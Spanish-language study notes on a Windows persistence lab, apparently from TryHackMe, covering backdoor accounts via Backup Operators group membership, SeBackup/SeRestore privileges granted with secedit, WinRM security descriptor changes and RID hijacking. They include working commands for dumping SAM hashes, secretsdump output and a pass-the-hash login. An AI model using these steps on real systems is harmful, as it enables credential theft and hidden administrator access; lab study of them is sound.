---
layout: apunte
title: "2. Tampering With Unprivileged Accounts"
---

Tener las credenciales de acceso de un administrador debería ser la forma más fácil de conseguir persistencia en una máquina. Sin embargo, para hacerlo más difícil para el blue team, podemos manipular usuarios no privilegiados, los cuales no suelen ser tan monitorizados como los administradores y asignarles privilegios de administrador de alguna manera.

Empezaremos usando:

`Administrator:Password321`

------------------------------------------
<h2>Asignar Membresías de Grupos</h2>
Para esta parte de la tarea, asumiremos que hemos dumpeado los hashes de las contraseñas de la máquina de la víctima y exitosamente crackeado las contraseñas para las cuentas no privilegiadas en uso.

La forma directa de hacer a un usuario no privilegiado ganar privilegios administrativos es hacerlo parte del grupo **Administrators**. Podemos conseguir esto fácilmente con el comando:

```batch
net localgroup administrators thmuser0 /add
```

Esto te permitirá acceder al servidor usando RDP, WinRM o cualquier otro servicio de administración remota disponible.

Si esto resulta muy sospechoso, puedes usar el grupo **Backup Operators**. Los usuarios de este grupo no tienen privilegios administrativos pero pueden leer/escribir cualquier archivo o registro del sistema, ignorando cualquier DACL configurada. Esto nos permitiría copiar el contenido de los registros SAM y SYSTEM, lo que puede ser usado para recuperar hashes de contraseñas para todos los usuarios.

Para hacerlo, comenzamos añadiendo la cuenta al grupo de Backup Operators:

```batch
net localgroup "Backup Operators" thmuser1 /add
```

Como esta no es una cuenta privilegiada, no puede usar RDP o WinRM para conectarse de vuelta a la máquina a no ser que la añadamos a los grupos **Remote Desktop Users** (RDP) o **Remote Management Users** (WinRM). Usaremos WinRM para esta tarea:

```batch
net localgroup "Remote Management Users" thmuser1 /add
```

Asumiremos que ya hemos dumpeado las credenciales en el servidor y tenemos las credenciales de `thmuser1`.

`thmuser1:Password321`

Si intentas conectarte ahora desde tu máquina verás que aún siendo parte del grupo Backup Operators no puedes acceder a todos los archivos como esperas. Si echamos un vistazo rápido a los grupos asignados veremos que somos parte de dicho grupo, pero el grupo está deshabilitado:

```powershell
user@AttackBox$ evil-winrm -i 10.80.154.43 -u thmuser1 -p Password321

*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

Esto es debido al User Account Control (UAC). Una de las funcionalidades implementadas por UAC, **LocalAccountTokenFilterPolicy**, elimina cualquier cuenta local de sus privilegios de administración al inicial sesión remotamente. Aunque puedes elevar tus privilegios a través de UAC desde una sesión gráfica de usuario, si estás usando WinRM, estás confinado a tener un token de acceso limitado sin permisos de administración.

Para ser capaz de ganar de nuevo privilegios de administración, tendremos que deshabilitar LocalAccountTokenFilterPolicy cambiando la clave de registro a 1:

```batch
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Una vez configurado todo esto, estamos listos para usar el usuario backdoor. Primero, estableceremos una conexión WinRM y comprobaremos que el grupo Backup Operators está habilitado para nuestro usuario:

```powershell
user@AttackBox$ evil-winrm -i 10.80.154.43 -u thmuser1 -p Password321
        
*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```

Necesitamos proceder a hacer un backup de los archivos SAM y SYSTEM y descargarlos en nuestra máquina de atacante:

```powershell
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!
```

>[!NOTE] Si `Evil-WinRM` tarda mucho en descargar los archivos, siéntete libre de usar cualquier otro método de transferencia.

Con esos archivos, podemos dumpear los hashes de las contraseñas para todos los usuarios usando `secretsdump.py` o cualquier herramienta similar.

```bash
user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x41325422ca00e6552bb6508215d8b426
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9657e898170eb98b25861ef9cafe5bd6:::
thmuser1:1011:aad3b435b51404eeaad3b435b51404ee:e41fd391af74400faa4ff75868c93cce:::
[*] Cleaning up...
```

>[!CAUTION] En Kali Linux, la herramienta `impacket-secretsdump` es la nativa y la que funciona correctamente.

Y finalmente realizar el Pass-the-Hash para conectarnos a la máquina víctima con privilegios de administrador:

```bash
user@AttackBox$ evil-winrm -i 10.80.154.43 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

-----------------------------------------
<h2>Privilegios Especiales y Descriptores de Seguridad</h2>
Un resultado similar a añadir a un usuario al grupo Backup Operators, puede conseguirse sin modificar ninguna membresía a grupos. Los grupos especiales son especiales sólo porque el sistema operativo les asigna privilegios específicos por defecto. Los privilegios incluyen cosas como desde tener capacidad de apagar un servidor hasta las operaciones de mayor privilegio como tomar control de un archivo del sistema. Una lista completa de privilegios puede encontrarse [aquí](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).

En el caso del grupo de Backup Operators, tiene los siguientes dos privilegios asignados por defecto:

- **SeBackupPrivilege:** El usuario puede leer cualquier archivo en el sistema, ignorando cualquier DACL.
- **SeRestorePrivilege:** El usuario puede escribir cualquier archivo en el sistema, ignorando el DACL.

Podemos asignar dichos privilegios a cualquier usuario, independientemente de su grupo o membresías. Para hacerlo, podemos usar el comando `secedit`. Primero, exportamos la configuración actual a un archivo temporal:

```batch
secedit /export /cfg config.inf
```

Abrimos el archivo y añadimos nuestro usuario a las lineas en la configuración respecto a SeBackupPrivilege y SeRestorePrivilege:

!**Pasted image 20260701193953.png**

Finalmente, convertimos el archivo `.inf` en un archivo `.sdb` el cual es usado para cargar la configuración de nuevo en el sistema:

```batch
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

Deberías tener ahora un usuario con privilegios equivalentes a cualquier Backup Operator. El usuario seguirá sin poder iniciar sesión en el sistema vía WinRM, por lo que vamos a hacer algo al respecto.. En lugar de añadir al usuario al grupo de Remote Management Users, cambiaremos el descriptor de seguridad asociado con el servicio WinRM para permitir que `thmuser2` se conecte. Piensa en un descriptor de seguridad como un ACL pero aplicado a otras estructuras de sistema.

Para abrir la ventana de configuración para el descriptor de seguridad WinRM, puedes usar el siguiente comando en PowerShell (necesitarás usar la GUI para esto):

```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

Esto abrirá una ventana donde puedes añadir el usuario `thmuser2` y asignarle privilegios totales para conectarse a WinRM:

!**Pasted image 20260701194926.png**

Una vez hecho esto, nuestro usuario puede conectarse vía WinRM. Como el usuario tiene los privilegios SeBackup y SeRestore, podemos repetir estos pasos para recuperar hashes de contraseñas del archivo SAM y conectarnos de nuevo al usuario administrador.

Ten en cuenta que para que este usuario funcione con los privilegios dados, necesitas cambiar la clave de registro LocalAccountTokenFilterPolicy (solo que ya lo hemos hecho en el apartado anterior).

Si compruebas las membresías de grupo se verá como un usuario normal, nada sospechoso.

```batch
C:\> net user thmuser2
User name                    thmuser2

Local Group Memberships      *Users
Global Group memberships     *None
```

Una vez más, asumiremos haber dumpeado las credenciales del servidor y nos conectamos con `thmuser2:Password321`.

---------------------------------------
<h2>RID Hijacking</h2>
Otro método para ganar privilegios administrativos es cambiar algunos valores de registro para hacer pensar al sistema operativo que tú eres el administrador. 

Cuando un usuario es creado, un identificador llamado **Relative ID (RID)** es asignado a ellos. El RID es simplemente un identificador numérico que representa al usuario a lo largo del sistema. Cuando un usuario inicia sesión, el proceso LSASS obtiene un RID del registro SAM y crea un token de acceso asociado con ese RID. Si podemos alterar el valor del registro, podemos hacer que Windows nos asigne el token de Administrator, asociando el RID a ambas cuentas.

En cualquier sistema Windows, la cuenta de administrador por defecto, es asignada con **RID = 500**, y usuarios regulares suelen tener **RID >= 1000**.

Para encontrar el RID asignado por cualquier usuario, puedes usar el siguiente comando:

```batch
C:\> wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
```

El RID es el último trozo del SID (1010 para `thmuser3` y 500 para `Administrator`). El SID es un identificador que permite que el sistema operativo identifique a un usuario a lo largo del dominio.

Ahora sólo tenemos que asignar el RID=500 al usuario `thmuser3`. Para hacerlo, necesitams acceder al SAM usando Regedit. El SAM está restringido a la cuenta SYSTEM, por lo que incluso el Administrator no puede editarla. Para ejecutar Regedit como SYSTEM, usaremos psexec, disponible en `C:\tools\pstools`:

```batch
C:\tools\pstools> PsExec64.exe -i -s regedit
```

Desde el Regedit, vamos a `HKLM\SAM\SAM\Domains\Account\Users\ ` donde habrá una clave para cada usuario en la máquina. Como queremos modificar `thmuser2`, necesitamos buscar la clave con su RID en hex (1010=0x3F2). Bajo la clave correspondiente, habrá un valor llamado **F**, el cual contiene el RID efectivo del usuario en la posición 0x30:

!**Pasted image 20260701201856.png**

Ten en cuenta que el RID está almacenado en notación little-endian, por lo que los bits aparecen invertidos.

Ahora reemplazaremos esos dos bytes con el RID de Administrator en hex (500 = 0x01F4), cambiando entre bytes (F401):

!**Pasted image 20260701202019.png**

La próxima vez que `thmuser3` inicie sesión, LSASS lo asociará  con el mismo RID que Administrator y le dará los mismos privilegios.

Volveremos a asumir que has dumpeado las contraseñas y tienes `thmuser3:Password321`.